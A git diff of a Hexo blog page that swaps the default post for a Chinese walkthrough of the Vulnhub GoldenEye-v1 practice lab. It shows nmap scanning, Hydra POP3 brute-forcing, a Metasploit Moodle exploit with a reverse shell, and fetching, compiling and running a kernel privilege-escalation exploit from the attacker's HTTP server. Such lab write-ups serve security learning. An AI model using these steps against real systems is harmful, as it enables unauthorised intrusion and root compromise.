@@ -16,21 +16,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="GoldenEye-v1靶场实验环境: Vulnhub-GoldenEye-v1 kali-主机: 192.168.15.129 靶机：192.168.15.12 GoldenEye靶场1.信息收集123456789101.信息收集    kali扫描网段主机 nmap -sP 192.168.15.0&#x2F;24   发现主机 192.168.15.128   查看端口开放版本信息nmap -sS -">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
+<meta property="og:title" content="Vulnhub 1">
 <meta property="og:url" content="http://xiaomingjin1.github.io/2023/09/19/hello-world/index.html">
 <meta property="og:site_name" content="xiaoMJ">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="GoldenEye-v1靶场实验环境: Vulnhub-GoldenEye-v1 kali-主机: 192.168.15.129 靶机：192.168.15.12 GoldenEye靶场1.信息收集123456789101.信息收集    kali扫描网段主机 nmap -sP 192.168.15.0&#x2F;24   发现主机 192.168.15.128   查看端口开放版本信息nmap -sS -">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-09-19T04:05:24.294Z">
-<meta property="article:modified_time" content="2023-09-19T04:05:24.294Z">
+<meta property="article:modified_time" content="2023-09-30T10:30:12.514Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Hello World - xiaoMJ</title>
+  <title>Vulnhub 1 - xiaoMJ</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text="Vulnhub 1"></span>
           
         </div>
 
@@ -224,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          367 字
+          2.5k 字
         
       </span>
     
@@ -235,7 +235,7 @@
         
         
         
-          4 分钟
+          22 分钟
         
       </span>
     
@@ -272,24 +272,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header">Vulnhub 1</h1>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <h2 id="GoldenEye-v1靶场"><a href="#GoldenEye-v1靶场" class="headerlink" title="GoldenEye-v1靶场"></a>GoldenEye-v1靶场</h2><p>实验环境: <a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Vulnhub&spm=1001.2101.3001.7020">Vulnhub</a>-GoldenEye-v1</p>
+<p>kali-主机: 192.168.15.129</p>
+<p>靶机：192.168.15.12</p>
+<h2 id="GoldenEye靶场"><a href="#GoldenEye靶场" class="headerlink" title="GoldenEye靶场"></a>GoldenEye靶场</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.信息收集 <br>   kali扫描网段主机 nmap -sP 192.168.15.0/24<br>   发现主机 192.168.15.128<br>   查看端口开放版本信息nmap -sS -sV -T5 -A 192.168.15.128 得到开放了25 80端口Linux系统<br>   访问主页192.168.15.128发现页面信息可进入/sev-home/目录中。 进入需要登录账号密码<br>   在主页中查看源代码发现 terminal.js 点开发现注释里面有信息进行翻译得出两个用户名字是boris/natalya<br>   而boris的密码是一串编码进行HTML解码InvincibleHack3r<br>   刚才的登录页面登录boris账号密码 得到页面在非默认端口开启了pop3的服务<br>   用kali扫描这两个端口 nmap -sS -sV -T5 -A -p55006,55007 192.168.15.128 发现55006开启mail服务 55007开启了pop3<br>   通过收集的用户名字boris/natalya进行尝试登录<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
+<h3 id="2-用Hydra暴力破解"><a href="#2-用Hydra暴力破解" class="headerlink" title="2.用Hydra暴力破解"></a>2.用Hydra暴力破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">将收集的两个用户写入xmj文本中 <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;natalya\nboris&#x27;</span> &gt; xmj.txt  <br>自己收集的密码破解文本 pass.txt<br>hydra -L dmj.txt -P /桌面/pass.txt 192.168.15.128 -s 55007 pop3<br>解释：-L 用户名文本 -r 单个用户名后面写boris/Natalya -P 破解密码的路径 需要破解的IP -s 破解端口 服务<br>获得两个账号 用户：boris 密码：secret1!<br>             用户：natalya 密码：bird<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
+<h3 id="3-登录pop3邮箱"><a href="#3-登录pop3邮箱" class="headerlink" title="3.登录pop3邮箱"></a>3.登录pop3邮箱</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">可通过nc命令登录pop3<br>     nc 192.168.15.128 55007     ---登录邮箱<br>     user boris                  ---登录用户<br>     pass secret1!               ---登录密码<br>     list                        ---查看邮件数量<br>     retr 1~3                    ---查看邮件内容<br> 再登录user natalya 查看他们的邮件内容获得<br> 用户名：dr_doak<br> 密码：4England!<br> 网址severnaya-station.com/gnocertdir<br> 网址需要再本地添加hosts<br> 命令 vi /etc/hosts 再文件中加入 192.168.15.128 severnaya-station.com<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
+<h3 id="4-登录邮件中的网站"><a href="#4-登录邮件中的网站" class="headerlink" title="4.登录邮件中的网站"></a>4.登录邮件中的网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">本机就能访问severnaya-station.com/gnocertdir点击Login进行登录<br>  发现是moddle框架搭建点击my home是2.2.3的版本<br>  登录后在：Home / ▶ My home 右边发现： s3cret.txt 点击打开后发现图片复制图面链接<br>  命令下载到本地 wget http://severnaya-station.com/dir007key/for-007.jpg<br>  用strings（识别动态库版本指令）查看jpg文件底层内容！strings for-007.jpg<br>  发现eFdpbnRlcjE5OTV4IQ== 是<span class="hljs-built_in">base64</span>编码进行解码xWinter1995x!<br>  用户名：admin<br>  密码：xWinter1995x!<br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h3 id="5-MSF拿shell"><a href="#5-MSF拿shell" class="headerlink" title="5.MSF拿shell"></a>5.MSF拿shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs HTML">查看框架的漏洞搜索 Moodle 2.2.3 exp 发现 CVE-2013-3630 漏洞可利用<br>   在网站中需要修改执行PSpellShell<br>   登录msfconsole<br>   查询框架漏洞 search moodle<br>   use 1<br>   查看需要的配置 show options<br>   进行配置<br>   msfconsole                        ---进入MSF框架攻击界面<br>   search moodle                     ---查找 moodle类型 攻击的模块<br>   use 0                             ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本<br>   set username admin                ---设置用户名：admin<br>   set password xWinter1995x!        ---设置密码：xWinter1995x!<br>   set rhost severnaya-station.com   ---设置：rhosts severnaya-station.com<br>   set targeturi /gnocertdir         ---设置目录： /gnocertdir<br>   set payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse<br>   set lhost 192.168.15.128           ---设置：lhost 192.168.4.231（需要本地IP）<br>   可以查询攻击语句 show payload<br>   run 成功反弹shell<br>   拿到的是伪shell<br>   python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;     ---将shell进行tty<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="6-内核提权"><a href="#6-内核提权" class="headerlink" title="6.内核提权"></a>6.内核提权</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">uname -a 查看权限！发现Linux ubuntu 版本是<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">32</span><br>  谷歌搜索：Linux ubuntu <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">32</span> exploit<br>  获得exp版本：<span class="hljs-number">37292</span><br>  查询EXP版本号searchsploit <span class="hljs-number">37292</span>        ---搜索kali本地的exp库中<span class="hljs-number">37292</span>攻击脚本信息<br>  将EXP复制到桌面cp <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/linux/</span>local<span class="hljs-regexp">/37292.c /</span>root<span class="hljs-regexp">/桌面/</span>   ---目录自行修改<br>  gedit <span class="hljs-number">37292</span>.c 修改第<span class="hljs-number">143</span>行将gcc改为cc 因为他是用gcc编译靶场没有安装gcc靶场中执行which gcc没有 which cc 有目录<br>  在kali上在桌面上开启端口（<span class="hljs-number">37292</span>.c在哪儿开启那个目录）然后在目录下开启http服务：python -m SimpleHTTPServer <span class="hljs-number">8081</span><br>  在靶机上执行<br>  cd /<br>  cd /tmp<br>  wget -c http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">15.129</span>:<span class="hljs-number">8081</span>/<span class="hljs-number">37292</span>.c<br>  成功下载后执行cc编译：<br>  cc <span class="hljs-number">27292</span>.c -o xmj   ---C语言的CC代码编译点c文件   <br>  ./xmj 执行<br>  id 权限变为root<br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -307,7 +309,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
+      <div>Vulnhub 1</div>
       <div>http://xiaomingjin1.github.io/2023/09/19/hello-world/</div>
     </div>
     <div class="license-meta">
